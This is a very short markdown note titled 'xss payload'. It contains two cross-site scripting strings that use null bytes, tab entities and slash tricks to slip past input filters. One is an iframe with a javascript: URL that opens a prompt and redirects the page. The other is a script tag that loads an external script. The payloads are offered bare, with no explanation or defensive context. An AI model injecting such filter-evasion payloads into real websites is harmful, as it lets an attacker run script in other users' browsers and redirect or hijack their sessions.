# xss payload

```
<iframe %00 src="&Tab;javascript:prompt(document.location="https://google.com")&Tab;"%00>
<script/&Tab; src='https://github.com' /&Tab;></script>

```
